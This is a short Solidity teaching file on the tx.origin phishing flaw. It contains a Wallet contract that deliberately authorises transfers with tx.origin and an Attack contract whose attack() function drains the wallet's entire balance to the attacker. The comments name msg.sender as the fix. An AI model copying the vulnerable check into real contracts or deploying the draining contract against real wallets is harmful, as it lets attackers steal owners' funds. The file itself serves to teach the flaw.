// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/*
Phising with tx.origin
- What is tx.origin
- Contract using tx.origin
- Exploit
- Solution --> stop using tx.origin, use msg.sender
*/

/* What is tx.origin?
Alice -> A -> B (msg.sender = A)
                (tx.origin = Alice)
tx.origin is the address that create (at the origin) of this tx
*/

contract Wallet {
  address public immutable owner;

  constructor() {
    owner = msg.sender;
  }

  function deposit() public payable {}

  /// Alice -> Wallet.transfer() (tx.origin = Alice)
  /// Alice -> Eve's malicious contract -> Wallet.transfer() (tx.origin = Alice)
  function transfer(address _to, uint256 _amount) public {
    require(tx.origin == owner, "Not Owner");

    (bool sent, ) = payable(_to).call{ value: _amount }("");
    require(sent, "Failed to send Ether");
  }

  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
}

contract Attack {
  address payable public owner;
  Wallet wallet;

  constructor(Wallet _wallet) {
    wallet = _wallet;
    owner = payable(msg.sender);
  }

  function attack() public {
    wallet.transfer(owner, address(wallet).balance); // Here the hacker take all the Alice Eth, and it'll work since the origin of this tx is Alice
  }
}
